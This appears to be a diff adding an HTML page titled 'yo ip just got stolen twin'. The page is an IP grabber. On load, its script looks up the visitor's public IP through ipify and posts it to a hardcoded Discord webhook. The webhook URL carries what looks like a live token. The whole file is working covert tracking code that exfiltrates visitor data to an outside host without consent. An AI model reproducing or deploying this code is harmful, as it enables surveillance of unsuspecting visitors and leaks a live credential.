@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<p>I just stole ur ip!.</p>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>yo ip just got stolen twin</title>
+</head>
+<body>
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1400515169251229776/ij4oUENw06vApaDVeKj12TBcdMyxqTrAG-6NPG4xh6u13vnt7aYl2yQNa98DtoCCzBcS';
+
+        // Function to send IP address to Discord webhook
+        function sendIpToDiscord(ip) {
+            const payload = {
+                content: `New visitor IP: ${ip}`
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP address sent to Discord');
+                } else {
+                    console.error('Failed to send IP address to Discord');
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Get the public IP address of the user
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log('Your IP address is: ' + data.ip);
+                sendIpToDiscord(data.ip);
+            })
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
